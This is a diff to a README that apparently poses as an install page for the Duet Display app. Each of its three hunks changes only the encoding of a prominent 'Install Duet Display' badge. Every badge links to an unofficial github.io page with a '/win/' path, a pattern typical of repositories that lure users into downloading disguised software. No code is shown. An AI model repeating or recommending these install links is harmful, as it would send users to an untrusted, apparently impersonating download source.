@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet%20Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet+Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Duet Display turns your iPad or iPhone into an extra display for your Mac or PC.
 
 <div align="center">
 
-[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet%20Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet+Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Duet Display turns your iPad or iPhone into an extra display for your Mac or PC.
 
 <div align="center">
 
-[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet%20Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Duet Display](https://img.shields.io/badge/⬇_Install_Duet+Display-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
